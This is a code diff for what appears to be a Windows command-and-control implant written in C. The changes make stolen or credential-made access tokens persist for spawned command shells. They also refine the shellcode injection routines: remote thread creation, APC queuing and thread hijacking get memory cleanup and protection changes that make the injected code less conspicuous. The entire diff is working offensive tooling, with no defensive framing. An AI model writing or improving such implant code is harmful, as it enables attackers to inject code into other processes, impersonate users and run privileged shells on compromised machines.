@@ -37,6 +37,8 @@ int g_jitter_pct = AGENT_JITTER_PCT;
 
 // ── SYSTEM primary token (stored by getsystem, used by run_shell) ────────────
 static HANDLE g_system_token = NULL;
+// Primary token from steal-token/make-token; used by run_shell when g_system_token is NULL.
+static HANDLE g_stolen_token = NULL;
 
 /* Declared here because the shell path runs before the token helpers below. */
 static int enable_privilege(HANDLE hToken, const char *priv_name);
@@ -96,6 +98,9 @@ static char* run_shell(const char *cmd) {
 
     HANDLE hSysTok = (HANDLE)InterlockedCompareExchangePointer(
         (PVOID*)&g_system_token, NULL, NULL);
+    if (!hSysTok)
+        hSysTok = (HANDLE)InterlockedCompareExchangePointer(
+            (PVOID*)&g_stolen_token, NULL, NULL);
     if (hSysTok) {
         static const wchar_t cmd_app[] = L"C:\\Windows\\System32\\cmd.exe";
         static const wchar_t cmd_cwd[] = L"C:\\Windows\\System32";
@@ -1188,7 +1193,7 @@ static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
     DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
     DWORD tid = 0;
     HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, &tid);
-    if (!ht) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"CreateRemoteThread failed %lu",GetLastError()); return e; }
+    if (!ht) { DWORD err=GetLastError(); VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"CreateRemoteThread failed %lu",err); return e; }
     CloseHandle(ht); CloseHandle(hProc);
     char *out = (char*)malloc(128);
     snprintf(out, 128, "[+] injected %zu bytes into PID %d (TID=%lu)", sc_len, pid, (unsigned long)tid);
@@ -1198,12 +1203,13 @@ static char *inject_remote(int pid, const uint8_t *sc, size_t sc_len) {
 static char *inject_apc(int pid, const uint8_t *sc, size_t sc_len) {
     HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
     if (!hProc) { char *e=(char*)malloc(64); snprintf(e,64,"OpenProcess failed %lu",GetLastError()); return e; }
-    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID mem = VirtualAllocEx(hProc, NULL, sc_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
     if (!mem) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"VirtualAllocEx failed %lu",GetLastError()); return e; }
     SIZE_T written = 0;
     WriteProcessMemory(hProc, mem, sc, sc_len, &written);
+    DWORD old_prot; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old_prot);
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (snap == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return strdup("snapshot failed"); }
+    if (snap == INVALID_HANDLE_VALUE) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); return strdup("snapshot failed"); }
     THREADENTRY32 te; te.dwSize = sizeof(te);
     int queued = 0;
     if (Thread32First(snap, &te)) {
@@ -1231,7 +1237,7 @@ static char *thread_hijack(DWORD pid, const uint8_t *sc, size_t sc_len) {
     WriteProcessMemory(hProc, mem, sc, sc_len, &written);
     DWORD old; VirtualProtectEx(hProc, mem, sc_len, PAGE_EXECUTE_READ, &old);
     HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-    if (snap == INVALID_HANDLE_VALUE) { CloseHandle(hProc); return strdup("Toolhelp snapshot failed"); }
+    if (snap == INVALID_HANDLE_VALUE) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); return strdup("Toolhelp snapshot failed"); }
     THREADENTRY32 te; te.dwSize = sizeof(te);
     DWORD targetTID = 0;
     if (Thread32First(snap, &te)) {
@@ -1239,9 +1245,9 @@ static char *thread_hijack(DWORD pid, const uint8_t *sc, size_t sc_len) {
         while (Thread32Next(snap, &te));
     }
     CloseHandle(snap);
-    if (!targetTID) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"no thread in PID %lu",pid); return e; }
+    if (!targetTID) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"no thread in PID %lu",pid); return e; }
     HANDLE ht = OpenThread(THREAD_ALL_ACCESS, FALSE, targetTID);
-    if (!ht) { CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"OpenThread failed (err %lu)",GetLastError()); return e; }
+    if (!ht) { VirtualFreeEx(hProc,mem,0,MEM_RELEASE); CloseHandle(hProc); char *e=(char*)malloc(64); snprintf(e,64,"OpenThread failed (err %lu)",GetLastError()); return e; }
     SuspendThread(ht);
     CONTEXT ctx; memset(&ctx, 0, sizeof(ctx));
     ctx.ContextFlags = CONTEXT_CONTROL;
@@ -1405,18 +1411,24 @@ static char *token_steal(int pid) {
         char *e=(char*)malloc(64); snprintf(e,64,"OpenProcessToken failed (err %lu)",GetLastError()); return e;
     }
     CloseHandle(hProc);
+    /* Impersonation token for ImpersonateLoggedOnUser */
     HANDLE hDup;
     if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL,
                           SecurityImpersonation, TokenImpersonation, &hDup)) {
         CloseHandle(hTok);
         char *e=(char*)malloc(64); snprintf(e,64,"DuplicateTokenEx failed (err %lu)",GetLastError()); return e;
     }
+    /* Primary token for CreateProcessWithTokenW in run_shell */
+    HANDLE hPrim = NULL;
+    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
     CloseHandle(hTok);
     if (!ImpersonateLoggedOnUser(hDup)) {
-        CloseHandle(hDup);
+        CloseHandle(hDup); if (hPrim) CloseHandle(hPrim);
         char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
     }
     CloseHandle(hDup);
+    HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, hPrim);
+    if (old) CloseHandle(old);
     char *out=(char*)malloc(64); snprintf(out,64,"[+] impersonating token from PID %d",pid); return out;
 }
 
@@ -1433,7 +1445,12 @@ static char *token_make(const char *user, const char *domain, const char *pass) 
         CloseHandle(hTok);
         char *e=(char*)malloc(64); snprintf(e,64,"ImpersonateLoggedOnUser failed (err %lu)",GetLastError()); return e;
     }
+    /* Store primary token for run_shell */
+    HANDLE hPrim = NULL;
+    DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrim);
     CloseHandle(hTok);
+    HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, hPrim);
+    if (old) CloseHandle(old);
     char *out=(char*)malloc(256); snprintf(out,256,"[+] impersonating %s\\%s",domain,user); return out;
 }
 
@@ -2691,6 +2708,8 @@ void dispatch_task(AgentTask *task) {
     }
     else if (strcmp(type_upper, "TOKEN_DROP") == 0 || strcmp(type_upper, "REV2SELF") == 0) {
         RevertToSelf();
+        HANDLE old = (HANDLE)InterlockedExchangePointer((PVOID*)&g_stolen_token, NULL);
+        if (old) CloseHandle(old);
         agent_send_result(task->id, "[+] reverted to original token", "");
     }
     else if (strcmp(type_upper, "TOKEN_WHOAMI") == 0) {
